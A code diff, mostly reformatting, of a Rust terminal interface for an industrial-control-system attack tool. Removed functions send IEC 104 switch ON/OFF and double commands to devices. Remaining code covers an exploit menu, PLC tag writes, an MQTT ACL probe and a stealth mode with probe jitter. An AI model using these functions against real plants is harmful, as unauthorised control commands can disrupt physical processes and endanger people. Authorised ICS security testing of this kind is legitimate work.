-                            obj.ioa, obj.type_id, obj.decoded
-                        ));
-                    }
-                    out(&format!("[+] {} object(s) returned", objs.len()));
-                }
-                Err(e) => out(&format!("[-] GI failed: {e}")),
-            }
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_iec104_sc_on(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::iec104::client;
-    let ioa = input.trim().parse::<u32>().unwrap_or(1);
-    out(&format!(
-        "[*] IEC 104 Single Command ON to IOA {ioa} on {ip}..."
-    ));
-    match client::connect(ip, port) {
-        Ok(mut sess) => match client::single_command(&mut sess, ioa, true) {
-            Ok(true) => out("[+] Single Command ON confirmed"),
-            Ok(false) => out("[!] Command sent: negative confirmation"),
-            Err(e) => out(&format!("[-] {e}")),
-        },
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_iec104_sc_off(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::iec104::client;
-    let ioa = input.trim().parse::<u32>().unwrap_or(1);
-    out(&format!(
-        "[*] IEC 104 Single Command OFF to IOA {ioa} on {ip}..."
-    ));
-    match client::connect(ip, port) {
-        Ok(mut sess) => match client::single_command(&mut sess, ioa, false) {
-            Ok(true) => out("[+] Single Command OFF confirmed"),
-            Ok(false) => out("[!] Command sent: negative confirmation"),
-            Err(e) => out(&format!("[-] {e}")),
-        },
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_iec104_dc(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::iec104::client;
-    let (ioa_s, state_s) = input.split_once(':').unwrap_or((input, "2"));
-    let ioa = ioa_s.trim().parse::<u32>().unwrap_or(1);
-    let state = state_s.trim().parse::<u8>().unwrap_or(2).clamp(1, 3);
-    let state_name = match state {
-        1 => "OFF",
-        2 => "ON",
-        _ => "INDETERMINATE",
-    };
-    out(&format!(
-        "[*] IEC 104 Double Command IOA {ioa} state={state_name} on {ip}..."
-    ));
-    match client::connect(ip, port) {
-        Ok(mut sess) => match client::double_command(&mut sess, ioa, state) {
-            Ok(true) => out("[+] Double Command confirmed"),
-            Ok(false) => out("[!] Command sent: negative confirmation"),
-            Err(e) => out(&format!("[-] {e}")),
-        },
-        Err(e) => out(&format!("[-] {e}")),
-    }
 }
 
 // ─── Rendering ───────────────────────────────────────────────────────────────
@@ -5345,7 +2970,6 @@ fn draw_device_list(frame: &mut Frame, area: Rect, app: &mut App) {
         .highlight_symbol("\u{25b6} ");
 
     frame.render_stateful_widget(list, area, &mut app.list_state);
-
 }
 
 fn draw_right_panel(frame: &mut Frame, area: Rect, app: &mut App) {
@@ -5405,10 +3029,9 @@ fn draw_detail_panel(frame: &mut Frame, area: Rect, app: &App) {
                         Value::String(s) if !s.is_empty() => s.clone(),
                         // booleans are shown via capability lines; objects are per-vendor
                         // blobs for multi devices; protocols key is handled separately
-                        Value::Null
-                        | Value::String(_)
-                        | Value::Bool(_)
-                        | Value::Object(_) => continue,
+                        Value::Null | Value::String(_) | Value::Bool(_) | Value::Object(_) => {
+                            continue
+                        }
                         _ if k == "protocols" => continue,
                         Value::Array(arr) => arr
                             .iter()
@@ -5693,10 +3316,7 @@ fn draw_exploit_menu(frame: &mut Frame, area: Rect, app: &mut App) {
 /// Uses contextual matching: INST table rows establish which struct tag owns the
 /// subsequent member lines, forming the full path `StructTag.Field` for lookup.
 /// This correctly handles multiple struct tags that share identically-named fields.
-fn build_leaf_line_indices(
-    lines: &[String],
-    leaves: &[(String, bool)],
-) -> Vec<(usize, usize)> {
+fn build_leaf_line_indices(lines: &[String], leaves: &[(String, bool)]) -> Vec<(usize, usize)> {
     if leaves.is_empty() {
         return Vec::new();
     }
@@ -5738,7 +3358,9 @@ fn build_leaf_line_indices(
                     }
                 }
             }
-        } else if line.get(2..8).is_some_and(|s| s.trim().parse::<u64>().is_ok())
+        } else if line
+            .get(2..8)
+            .is_some_and(|s| s.trim().parse::<u64>().is_ok())
             && line.is_char_boundary(10)
             && line.is_char_boundary(line.len().min(52))
         {
@@ -5803,14 +3425,25 @@ fn draw_output_zoom(frame: &mut Frame, area: Rect, app: &App) {
 
     let is_overview = app.output_from_cache && app.scan_timestamp.is_none();
     let is_stale = app.output_from_cache
-        && app.scan_timestamp.is_some_and(|t| {
-            t.elapsed() > std::time::Duration::from_secs(24 * 3600)
-        });
-    let out_label = if is_overview { "Overview" } else if is_stale { "Output \u{26a0}" } else { "Output" };
-    let c_hint = if app.output_line_backup.is_some() { "[C] restore" } else { "[C] clear" };
+        && app
+            .scan_timestamp
+            .is_some_and(|t| t.elapsed() > std::time::Duration::from_secs(24 * 3600));
+    let out_label = if is_overview {
+        "Overview"
+    } else if is_stale {
+        "Output \u{26a0}"
+    } else {
+        "Output"
+    };
+    let c_hint = if app.output_line_backup.is_some() {
+        "[C] restore"
+    } else {
+        "[C] clear"
+    };
 
     // Access class of the currently selected leaf (for the cursor mode title).
-    let current_access: &str = app.output_leaf_cursor
+    let current_access: &str = app
+        .output_leaf_cursor
         .and_then(|n| app.tag_leaf_line_indices.get(n).map(|&(_, li)| li))
         .and_then(|li| app.tag_leaves.get(li))
         .map_or("User", |(path, _)| {
@@ -5820,12 +3453,16 @@ fn draw_output_zoom(frame: &mut Frame, area: Rect, app: &App) {
 
     let title = if app.output_leaf_cursor.is_some() && !app.tag_leaves.is_empty() {
         let n = app.output_leaf_cursor.unwrap_or(0);
-        let warn = if is_overview || is_stale { " \u{2014} \u{26a0} tags may have changed" } else { "" };
+        let warn = if is_overview || is_stale {
+            " \u{2014} \u{26a0} tags may have changed"
+        } else {
+            ""
+        };
         let access_note = match current_access {
-            "Input"  => "  [Input \u{2014} hardware owned]",
+            "Input" => "  [Input \u{2014} hardware owned]",
             "Output" => "  [Output \u{2014} PLC overrides in Run mode]",
             "Config" => "  [Config \u{2014} writable in Program mode]",
-            _        => "",
+            _ => "",
         };
         format!(
             " {out_label} \u{2014} leaf {}/{}{access_note}{warn} \u{2014} [J/K] navigate  [W] write  {c_hint}  [O/ESC] close ",
@@ -5833,7 +3470,13 @@ fn draw_output_zoom(frame: &mut Frame, area: Rect, app: &App) {
             app.tag_leaves.len()
         )
     } else if !app.tag_leaves.is_empty() {
-        let warn = if is_overview { " \u{2014} \u{26a0} DB snapshot" } else if is_stale { " \u{2014} \u{26a0} >24h old" } else { "" };
+        let warn = if is_overview {
+            " \u{2014} \u{26a0} DB snapshot"
+        } else if is_stale {
+            " \u{2014} \u{26a0} >24h old"
+        } else {
+            ""
+        };
         format!(
             " {out_label} \u{2014} {} navigable tags{warn} \u{2014} [I] interactive  [J/K] navigate  [W] write  {c_hint}  [O/ESC] close ",
             app.tag_leaves.len()
@@ -5853,7 +3496,11 @@ fn draw_output_zoom(frame: &mut Frame, area: Rect, app: &App) {
         )
     };
     let title = if app.output_filter_active || !app.output_filter.is_empty() {
-        let cursor = if app.output_filter_active { "\u{2588}" } else { "" };
+        let cursor = if app.output_filter_active {
+            "\u{2588}"
+        } else {
+            ""
+        };
         let n_raw = app.output_lines.len();
         let suffix = if filter_lc.is_empty() {
             format!("  [/{cursor}]")
@@ -6291,7 +3938,10 @@ fn draw_help(frame: &mut Frame, area: Rect) {
         ]),
         Line::from(vec![
             Span::styled("  \u{25cf} ", s.fg(Color::Yellow)),
-            Span::styled("Yellow      Rockwell / EtherNet\u{b7}IP", s.fg(Color::White)),
+            Span::styled(
+                "Yellow      Rockwell / EtherNet\u{b7}IP",
+                s.fg(Color::White),
+            ),
         ]),
         Line::from(vec![
             Span::styled("  \u{25cf} ", s.fg(Color::Green)),
@@ -6319,7 +3969,10 @@ fn draw_help(frame: &mut Frame, area: Rect) {
         ]),
         Line::from(vec![
             Span::styled("  \u{25cf} ", s.fg(Color::Rgb(255, 140, 0))),
-            Span::styled("Orange      Multi-service host (multiple protocols)", s.fg(Color::White)),
+            Span::styled(
+                "Orange      Multi-service host (multiple protocols)",
+                s.fg(Color::White),
+            ),
         ]),
         Line::from(vec![
             Span::styled("  \u{25cf} ", s.fg(Color::Gray)),
@@ -6438,29 +4091,27 @@ fn draw_references(frame: &mut Frame, area: Rect, app: &mut App) {
     let s = Style::default();
     let refs: Vec<&Reference> = references_vendor_refs(app);
 
-    let vendor_label = app
-        .selected_device()
-        .map_or_else(
-            || "\u{2014}".into(),
-            |d| {
-                if d.vendor == "multi" {
-                    d.fields
-                        .get("protocols")
-                        .and_then(|v| v.as_array())
-                        .map_or_else(
-                            || "multi".into(),
-                            |arr| {
-                                arr.iter()
-                                    .filter_map(|v| v.as_str())
-                                    .collect::<Vec<_>>()
-                                    .join(" + ")
-                            },
-                        )
-                } else {
-                    d.vendor.clone()
-                }
-            },
-        );
+    let vendor_label = app.selected_device().map_or_else(
+        || "\u{2014}".into(),
+        |d| {
+            if d.vendor == "multi" {
+                d.fields
+                    .get("protocols")
+                    .and_then(|v| v.as_array())
+                    .map_or_else(
+                        || "multi".into(),
+                        |arr| {
+                            arr.iter()
+                                .filter_map(|v| v.as_str())
+                                .collect::<Vec<_>>()
+                                .join(" + ")
+                        },
+                    )
+            } else {
+                d.vendor.clone()
+            }
+        },
+    );
 
     let title = format!(" Research References \u{2014} {vendor_label} ");
 
@@ -6479,7 +4130,10 @@ fn draw_references(frame: &mut Frame, area: Rect, app: &mut App) {
         )));
     } else {
         lines.push(Line::from(Span::styled(
-            format!("  {} references  (source: neutrinoguy/awesome-ics-writeups)", refs.len()),
+            format!(
+                "  {} references  (source: neutrinoguy/awesome-ics-writeups)",
+                refs.len()
+            ),
             s.fg(Color::DarkGray),
         )));
         lines.push(Line::from(""));
@@ -6490,7 +4144,10 @@ fn draw_references(frame: &mut Frame, area: Rect, app: &mut App) {
                     format!("  [{source}]  ", source = r.source),
                     s.fg(Color::Cyan),
                 ),
-                Span::styled(r.title.clone(), s.fg(Color::White).add_modifier(Modifier::BOLD)),
+                Span::styled(
+                    r.title.clone(),
+                    s.fg(Color::White).add_modifier(Modifier::BOLD),
+                ),
             ]));
             let url_display = if r.url.chars().count() > inner_width {
                 let truncate_at = r
@@ -6708,7 +4365,9 @@ fn handle_output_zoom(app: &mut App, code: KeyCode, mods: KeyModifiers) {
                         app.scroll_to_output_line(first_line);
                     }
                     if let Some(cached) = app.per_device_output.get_mut(&app.tag_write_ip) {
-                        cached.tag_leaf_line_indices.clone_from(&app.tag_leaf_line_indices);
+                        cached
+                            .tag_leaf_line_indices
+                            .clone_from(&app.tag_leaf_line_indices);
                         cached.output_leaf_cursor = app.output_leaf_cursor;
                     }
                 }
@@ -6751,8 +4410,11 @@ fn handle_output_zoom(app: &mut App, code: KeyCode, mods: KeyModifiers) {
                             app.mode = Mode::CacheRescanPrompt;
                         } else {
                             let label = format!("Write Tag: {path}");
-                            let write_idx =
-                                if app.tag_write_vendor.contains("beckhoff") { 8 } else { 3 };
+                            let write_idx = if app.tag_write_vendor.contains("beckhoff") {
+                                8
+                            } else {
+                                3
+                            };
                             app.pending_exploit = Some(PendingExploit {
                                 vendor: app.tag_write_vendor.clone(),
                                 idx: write_idx,
@@ -6766,7 +4428,8 @@ fn handle_output_zoom(app: &mut App, code: KeyCode, mods: KeyModifiers) {
                             app.mode = Mode::ExploitInput;
                         }
                     } else {
-                        app.output_lines.push("[!] This leaf is read-only".to_string());
+                        app.output_lines
+                            .push("[!] This leaf is read-only".to_string());
                     }
                 }
             }
@@ -6820,7 +4483,9 @@ fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers
                         app.scroll_to_output_line(first_line);
                     }
                     if let Some(cached) = app.per_device_output.get_mut(&app.tag_write_ip) {
-                        cached.tag_leaf_line_indices.clone_from(&app.tag_leaf_line_indices);
+                        cached
+                            .tag_leaf_line_indices
+                            .clone_from(&app.tag_leaf_line_indices);
                         cached.output_leaf_cursor = app.output_leaf_cursor;
                     }
                 }
@@ -6888,7 +4553,8 @@ fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers
                 ExportFormat::Json => "JSON",
                 ExportFormat::Csv => "CSV",
             };
-            app.output_lines.push(format!("[*] Export format: {fmt} (press X to export)"));
+            app.output_lines
+                .push(format!("[*] Export format: {fmt} (press X to export)"));
         }
         KeyCode::Char('d' | 'D') => {
             if let Some(dev) = app.selected_device() {
@@ -6912,7 +4578,9 @@ fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers
             app.mode = Mode::WordlistInput;
         }
         KeyCode::Char('m' | 'M') => {
-            let ip = app.selected_device_ip().unwrap_or_else(|| "127.0.0.1".to_string());
+            let ip = app
+                .selected_device_ip()
+                .unwrap_or_else(|| "127.0.0.1".to_string());
             let port = app.field_port(&["port"], 1883);
             app.enter_mqtt_monitor(&ip, port);
         }
@@ -6923,7 +4591,8 @@ fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers
         KeyCode::Char('t') => {
             app.mqtt_conn.tls = !app.mqtt_conn.tls;
             let state = if app.mqtt_conn.tls { "ON" } else { "OFF" };
-            app.output_lines.push(format!("[*] MQTT TLS: {state} (applies on next connect)"));
+            app.output_lines
+                .push(format!("[*] MQTT TLS: {state} (applies on next connect)"));
             app.output_scroll = 0;
         }
         KeyCode::Char('v') => {
@@ -6936,8 +4605,13 @@ fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers
             app.stealth = !app.stealth;
             casket::core::autodetect::set_stealth(app.stealth);
             let state = if app.stealth { "ON" } else { "OFF" };
-            app.log(format!("[!] Stealth mode {state}: probes will {}",
-                if app.stealth { "shuffle order and add jitter" } else { "run at full speed" }
+            app.log(format!(
+                "[!] Stealth mode {state}: probes will {}",
+                if app.stealth {
+                    "shuffle order and add jitter"
+                } else {
+                    "run at full speed"
+                }
             ));
         }
         KeyCode::Char('?') => app.mode = Mode::Help,
@@ -7271,9 +4945,21 @@ fn load_db_tags_to_output(ip: &str, lines: &mut Vec<String>) -> Vec<(String, boo
     use crate::db::{Database, MemberRecord};
     use casket::vendors::rockwell::driver;
 
-    let Ok(db) = Database::open(&Database::default_path()) else { return Vec::new() };
-    let Ok(tags) = db.load_tags(ip) else { return Vec::new() };
-    let Ok(members) = db.load_members(ip) else { return Vec::new() };
+    let Ok(db) = Database::open(&Database::default_path()) else {
+        return Vec::new();
+    };
+    let mut tags = db
+        .load_tags_for_protocol(ip, "rockwell")
+        .unwrap_or_default();
+    if tags.is_empty() {
+        tags = db.load_tags(ip).unwrap_or_default();
+    }
+    let mut members = db
+        .load_members_for_protocol(ip, "rockwell")
+        .unwrap_or_default();
+    if members.is_empty() {
+        members = db.load_members(ip).unwrap_or_default();
+    }
     if tags.is_empty() && members.is_empty() {
         return Vec::new();
     }
@@ -7288,8 +4974,7 @@ fn load_db_tags_to_output(ip: &str, lines: &mut Vec<String>) -> Vec<(String, boo
 
     // Orphan prefixes: member prefixes with no matching top-level tag row.
     // These represent Beckhoff ADS program/GVL groups or other non-CIP vendors.
-    let top_names: std::collections::HashSet<&str> =
-        tags.iter().map(|t| t.name.as_str()).collect();
+    let top_names: std::collections::HashSet<&str> = tags.iter().map(|t| t.name.as_str()).collect();
     let mut orphan_prefixes: Vec<&str> = member_map
         .keys()
         .copied()
@@ -7310,13 +4995,23 @@ fn load_db_tags_to_output(ip: &str, lines: &mut Vec<String>) -> Vec<(String, boo
     // Render top-level tags, expanding STRUCT tags with their stored members.
     for t in &tags {
         let (base, dims) = driver::type_parts(u16::try_from(t.tag_type).unwrap_or(u16::MAX));
-        lines.push(fmt_tag_row(t.instance_id, &t.name, &base, dims, "-", t.tag_type));
+        lines.push(fmt_tag_row(
+            t.instance_id,
+            &t.name,
+            &base,
+            dims,
+            "-",
+            t.tag_type,
+        ));
         if !base.starts_with("STRUCT") && dims == "-" {
             leaves.push((t.name.clone(), true));
         } else if base.starts_with("STRUCT") {
             if let Some(struct_members) = member_map.get(t.name.as_str()) {
                 for m in struct_members {
-                    let field = m.path.find('.').map_or(m.path.as_str(), |i| &m.path[i + 1..]);
+                    let field = m
+                        .path
+                        .find('.')
+                        .map_or(m.path.as_str(), |i| &m.path[i + 1..]);
                     let access = tag_access_class(&m.path);
                     lines.push(format!(
                         "           .{field:<40}  {:<14}  {:<4}  {:<18}  {:<9}  {access:<6}",
@@ -7332,9 +5027,19 @@ fn load_db_tags_to_output(ip: &str, lines: &mut Vec<String>) -> Vec<(String, boo
     // A synthetic INST row is used so build_leaf_line_indices sets current_struct correctly.
     for (idx, prefix) in orphan_prefixes.iter().enumerate() {
         if let Some(group) = member_map.get(prefix) {
-            lines.push(fmt_tag_row(i64::try_from(idx).unwrap_or(i64::MAX), prefix, "GROUP", "-", "-", 0));
+            lines.push(fmt_tag_row(
+                i64::try_from(idx).unwrap_or(i64::MAX),
+                prefix,
+                "GROUP",
+                "-",
+                "-",
+                0,
+            ));
             for m in group {
-                let field = m.path.find('.').map_or(m.path.as_str(), |i| &m.path[i + 1..]);
+                let field = m
+                    .path
+                    .find('.')
+                    .map_or(m.path.as_str(), |i| &m.path[i + 1..]);
                 let access = tag_access_class(&m.path);
                 lines.push(format!(
                     "           .{field:<40}  {:<14}  {:<4}  {:<18}  {:<9}  {access:<6}",
@@ -7357,7 +5062,9 @@ fn load_db_tags_to_output(ip: &str, lines: &mut Vec<String>) -> Vec<(String, boo
 /// Called when the exploit menu opens for Rockwell/enip with an empty output panel.
 /// Loads saved DB tags and synthesizes navigable leaves — no background network access.
 fn maybe_auto_load_tags(app: &mut App) {
-    let Some(vendor) = app.selected_vendor() else { return };
+    let Some(vendor) = app.selected_vendor() else {
+        return;
+    };
     let vendor_lc = vendor.to_lowercase();
     if !matches!(vendor_lc.as_str(), "rockwell" | "enip" | "beckhoff") {
         return;
@@ -7365,18 +5072,23 @@ fn maybe_auto_load_tags(app: &mut App) {
     if !app.output_lines.is_empty() {
         return;
     }
-    let Some(ip) = app.selected_device_ip() else { return };
+    let Some(ip) = app.selected_device_ip() else {
+        return;
+    };
 
     let leaves = load_db_tags_to_output(&ip, &mut app.output_lines);
     if !leaves.is_empty() {
         app.tag_leaves = leaves;
-        app.tag_leaf_line_indices =
-            build_leaf_line_indices(&app.output_lines, &app.tag_leaves);
+        app.tag_leaf_line_indices = build_leaf_line_indices(&app.output_lines, &app.tag_leaves);
         app.output_leaf_cursor = None;
         app.output_from_cache = true;
         app.scan_timestamp = None;
         app.tag_write_ip = ip;
-        app.tag_write_port = if vendor_lc == "beckhoff" { 48898 } else { 44818 };
+        app.tag_write_port = if vendor_lc == "beckhoff" {
+            48898
+        } else {
+            44818
+        };
         app.tag_write_vendor = vendor;
     }
 }
@@ -7384,19 +5096,30 @@ fn maybe_auto_load_tags(app: &mut App) {
 /// Fire "List Tags" directly (bypassing the confirmation dialog) when the user
 /// presses I on Overview data to request struct expansion.
 fn fire_overview_list_tags(app: &mut App) {
-    let Some(vendor) = app.selected_vendor() else { return };
+    let Some(vendor) = app.selected_vendor() else {
+        return;
+    };
     let vendor_lc = vendor.to_ascii_lowercase();
     if !matches!(vendor_lc.as_str(), "rockwell" | "enip" | "beckhoff") {
         return;
     }
-    let exploit_label =
-        if vendor_lc == "beckhoff" { "Enumerate Symbols (ADS)" } else { "List Tags" };
+    let exploit_label = if vendor_lc == "beckhoff" {
+        "Enumerate Symbols (ADS)"
+    } else {
+        "List Tags"
+    };
     app.exploit_defs = exploits_for(&vendor);
-    let Some(idx) = app.exploit_defs.iter().position(|e| e.label == exploit_label) else {
+    let Some(idx) = app
+        .exploit_defs
+        .iter()
+        .position(|e| e.label == exploit_label)
+    else {
         return;
     };
     app.exploit_sel = idx;
-    let Some(ip) = app.selected_device_ip() else { return };
+    let Some(ip) = app.selected_device_ip() else {
+        return;
+    };
     let port = app.action_port(&vendor, idx);
     let pending = PendingExploit {
         vendor,
@@ -7441,11 +5164,13 @@ fn draw_cache_rescan_popup(frame: &mut Frame, area: Rect, app: &App) {
     let block = Block::default()
         .borders(Borders::ALL)
         .title(" Cached Tag Data ")
-        .title_style(Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD))
+        .title_style(
+            Style::default()
+                .fg(Color::Yellow)
+                .add_modifier(Modifier::BOLD),
+        )
         .border_style(Style::default().fg(Color::Yellow));
-    let para = Paragraph::new(text)
-        .block(block)
-        .wrap(Wrap { trim: false });
+    let para = Paragraph::new(text).block(block).wrap(Wrap { trim: false });
     frame.render_widget(para, popup);
 }
 
@@ -7556,13 +5281,19 @@ fn execute_pending_exploit(app: &mut App, pending: &PendingExploit) {
         let label2 = pending.label.clone();
         let port = pending.port;
         std::thread::spawn(move || {
-            struct DoneGuard { tx: mpsc::Sender<ScanEvent>, msg: String }
+            struct DoneGuard {
+                tx: mpsc::Sender<ScanEvent>,
+                msg: String,
+            }
             impl Drop for DoneGuard {
                 fn drop(&mut self) {
                     let _ = self.tx.send(ScanEvent::Done(std::mem::take(&mut self.msg)));
                 }
             }
-            let _guard = DoneGuard { tx: tx.clone(), msg: format!("{label2} @ {ip2}") };
+            let _guard = DoneGuard {
+                tx: tx.clone(),
+                msg: format!("{label2} @ {ip2}"),
+            };
 
             let tx2 = tx.clone();
             let out = move |msg: &str| {
@@ -7595,7 +5326,7 @@ pub fn run(db: &Database) -> Result<()> {
 
 fn run_loop<B: Backend>(terminal: &mut Terminal<B>, app: &mut App, db: &Database) -> Result<()> {
     loop {
-        app.drain_scan_events(db);  // flush queued events before swapping device buffers
+        app.drain_scan_events(db); // flush queued events before swapping device buffers
         app.sync_device_output();
         app.drain_mqtt_messages();
         terminal.draw(|f| draw(f, app))?;
@@ -7630,7 +5361,11 @@ fn export_to_file(app: &App) -> anyhow::Result<String> {
             let fields_json = serde_json::to_string(&d.fields)
                 .unwrap_or_else(|_| "{}".to_string())
                 .replace('"', "\"\"");
-            let _ = writeln!(out, "{},{},{},\"{}\"", d.ip, d.vendor, d.last_seen, fields_json);
+            let _ = writeln!(
+                out,
+                "{},{},{},\"{}\"",
+                d.ip, d.vendor, d.last_seen, fields_json
+            );
         }
         std::fs::write(&filename, out)?;
         return Ok(filename);
@@ -7704,8 +5439,15 @@ fn draw_mqtt_panel(frame: &mut Frame, area: Rect, app: &mut App) {
     } else {
         format!("  filter: {}", app.mqtt_filter)
     };
-    let tls_badge = if app.mqtt_conn.tls || app.mqtt_broker.contains(":8883") { "  TLS" } else { "" };
-    let ver_badge = match app.mqtt_conn.version { MqttVersion::V311 => "", MqttVersion::V5 => "  v5.0" };
+    let tls_badge = if app.mqtt_conn.tls || app.mqtt_broker.contains(":8883") {
+        "  TLS"
+    } else {
+        ""
+    };
+    let ver_badge = match app.mqtt_conn.version {
+        MqttVersion::V311 => "",
+        MqttVersion::V5 => "  v5.0",
+    };
     let header_text = format!(
         " MQTT  {}{}{}  \u{2502}  {} topics  \u{2502}  {} msgs{}  \u{2502}  [ESC/M] disconnect",
         app.mqtt_broker,
@@ -7731,14 +5473,22 @@ fn draw_mqtt_panel(frame: &mut Frame, area: Rect, app: &mut App) {
         .iter()
         .filter(|(t, _, _)| filter_lower.is_empty() || t.to_lowercase().contains(&filter_lower))
         .map(|(topic, count, _)| {
-            let r = if app.mqtt_retained.contains(topic) { "R" } else { " " };
+            let r = if app.mqtt_retained.contains(topic) {
+                "R"
+            } else {
+                " "
+            };
             ListItem::new(format!(" [{r}] {topic:<46} {count:>4}"))
         })
         .collect();
 
     let topic_list = List::new(visible)
         .block(Block::default().borders(Borders::ALL).title(" Topics "))
-        .highlight_style(Style::new().bg(Color::DarkGray).add_modifier(Modifier::BOLD))
+        .highlight_style(
+            Style::new()
+                .bg(Color::DarkGray)
+                .add_modifier(Modifier::BOLD),
+        )
         .highlight_symbol("\u{25b6} ");
     frame.render_stateful_widget(topic_list, cols[0], &mut app.mqtt_topic_list_state);
 
@@ -7750,19 +5500,21 @@ fn draw_mqtt_panel(frame: &mut Frame, area: Rect, app: &mut App) {
         .collect();
 
     if app.mqtt_attack_lines.is_empty() {
-        let detail_text =
-            if let Some((topic, count, last_display)) = filtered.get(selected_idx) {
-                let retained_str =
-                    if app.mqtt_retained.contains(topic.as_str()) { "yes" } else { "no" };
-                format!(
+        let detail_text = if let Some((topic, count, last_display)) = filtered.get(selected_idx) {
+            let retained_str = if app.mqtt_retained.contains(topic.as_str()) {
+                "yes"
+            } else {
+                "no"
+            };
+            format!(
                     "\n Topic:    {topic}\n\n Last:     {last_display}\n\n Messages: {count}\n Retained: {retained_str}"
                 )
-            } else if app.mqtt_session.is_some() {
-                "\n Waiting for messages…\n\n Subscribed to # and $SYS/#\n\n [a] ACL  [r] Retain  [s] Session"
+        } else if app.mqtt_session.is_some() {
+            "\n Waiting for messages…\n\n Subscribed to # and $SYS/#\n\n [a] ACL  [r] Retain  [s] Session"
                     .to_string()
-            } else {
-                "\n (not connected)".to_string()
-            };
+        } else {
+            "\n (not connected)".to_string()
+        };
 
         frame.render_widget(
             Paragraph::new(detail_text)
@@ -7770,8 +5522,15 @@ fn draw_mqtt_panel(frame: &mut Frame, area: Rect, app: &mut App) {
             cols[1],
         );
     } else {
-        let running_tag = if app.mqtt_attack_running { " [running\u{2026}]" } else { "" };
-        let title = format!(" {}{running_tag} — press c to clear ", app.mqtt_attack_label);
+        let running_tag = if app.mqtt_attack_running {
+            " [running\u{2026}]"
+        } else {
+            ""
+        };
+        let title = format!(
+            " {}{running_tag} — press c to clear ",
+            app.mqtt_attack_label
+        );
         let content = app.mqtt_attack_lines.join("\n");
         let scroll_row = u16::try_from(app.mqtt_attack_scroll).unwrap_or(u16::MAX);
         frame.render_widget(
@@ -7792,11 +5551,17 @@ fn handle_mqtt_monitor(app: &mut App, code: KeyCode) {
         }
         KeyCode::Char('j') | KeyCode::Down => {
             let max = app.mqtt_topics.len().saturating_sub(1);
-            let next = app.mqtt_topic_list_state.selected().map_or(0, |i| (i + 1).min(max));
+            let next = app
+                .mqtt_topic_list_state
+                .selected()
+                .map_or(0, |i| (i + 1).min(max));
             app.mqtt_topic_list_state.select(Some(next));
         }
         KeyCode::Char('k') | KeyCode::Up => {
-            let prev = app.mqtt_topic_list_state.selected().map_or(0, |i| i.saturating_sub(1));
+            let prev = app
+                .mqtt_topic_list_state
+                .selected()
+                .map_or(0, |i| i.saturating_sub(1));
             app.mqtt_topic_list_state.select(Some(prev));
         }
         KeyCode::Char('/') => {
@@ -7804,14 +5569,16 @@ fn handle_mqtt_monitor(app: &mut App, code: KeyCode) {
         }
         KeyCode::Char('a') => {
             if app.mqtt_attack_running {
-                app.mqtt_attack_lines.push("[*] Attack already running\u{2026}".into());
+                app.mqtt_attack_lines
+                    .push("[*] Attack already running\u{2026}".into());
             } else {
                 run_tui_acl(app);
             }
         }
         KeyCode::Char('r') => {
             if app.mqtt_attack_running {
-                app.mqtt_attack_lines.push("[*] Attack already running\u{2026}".into());
+                app.mqtt_attack_lines
+                    .push("[*] Attack already running\u{2026}".into());
             } else {
                 run_tui_retain(app);
             }
@@ -7958,24 +5725,17 @@ fn handle_import_input(app: &mut App, db: &Database, code: KeyCode) {
                     let mut imported = 0usize;
                     for host in &hosts {
                         let mut obj = serde_json::Map::new();
-                        obj.insert(
-                            "open_ports".to_string(),
-                            serde_json::json!(host.open_ports),
-                        );
+                        obj.insert("open_ports".to_string(), serde_json::json!(host.open_ports));
                         if !host.hostnames.is_empty() {
-                            obj.insert(
-                                "hostnames".to_string(),
-                                serde_json::json!(host.hostnames),
-                            );
+                            obj.insert("hostnames".to_string(), serde_json::json!(host.hostnames));
                         }
                         let fields = serde_json::Value::Object(obj);
                         if db.upsert_device(&host.ip, "nmap", &fields).is_ok() {
                             imported += 1;
                         }
                     }
-                    app.output_lines.push(format!(
-                        "[+] Imported {imported}/{total} hosts from {path}"
-                    ));
+                    app.output_lines
+                        .push(format!("[+] Imported {imported}/{total} hosts from {path}"));
                     app.reload(db);
                 }
             }
@@ -8105,7 +5865,9 @@ fn run_tui_acl(app: &mut App) {
         filtered.get(idx).map(|t| (*t).clone())
     };
     let Some(base) = base else { return };
-    let Some(arc) = app.mqtt_session.as_ref() else { return };
+    let Some(arc) = app.mqtt_session.as_ref() else {
+        return;
+    };
     let arc = Arc::clone(arc);
     let tx = app.scan_tx.clone();
 
@@ -8113,19 +5875,24 @@ fn run_tui_acl(app: &mut App) {
     app.mqtt_attack_lines.clear();
     app.mqtt_attack_lines.push(format!(" ACL probe: {base}"));
     app.mqtt_attack_lines.push("─".repeat(60));
-    app.mqtt_attack_lines.push(format!("{:<26} access", "variant"));
+    app.mqtt_attack_lines
+        .push(format!("{:<26} access", "variant"));
     app.mqtt_attack_lines.push("─".repeat(60));
     app.mqtt_attack_scroll = 0;
     app.mqtt_attack_label = "ACL Probe".into();
 
     std::thread::spawn(move || {
-        let mut session = arc.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
+        let mut session = arc
+            .lock()
+            .unwrap_or_else(std::sync::PoisonError::into_inner);
         session.flush_subacks();
         let mut tested = std::collections::HashSet::new();
         let variants = acl_variants(&base);
         for variant in variants {
             if tested.len() >= 20 {
-                let _ = tx.send(ScanEvent::MqttLine("[limit] max 20 variants reached.".into()));
+                let _ = tx.send(ScanEvent::MqttLine(
+                    "[limit] max 20 variants reached.".into(),
+                ));
                 break;
             }
             if !tested.insert(variant.clone()) {
@@ -8147,22 +5914,33 @@ fn run_tui_acl(app: &mut App) {
                     0
                 };
                 let _ = session.unsubscribe(&variant);
-                if granted { format!("SUB:YES({n})") } else { "SUB:DENY  ".into() }
+                if granted {
+                    format!("SUB:YES({n})")
+                } else {
+                    "SUB:DENY  ".into()
+                }
             } else {
                 "SUB:ERR   ".into()
             };
-            let pub_ok = session.publish(&variant, b"scadaver/acl-probe", 0, false).is_ok();
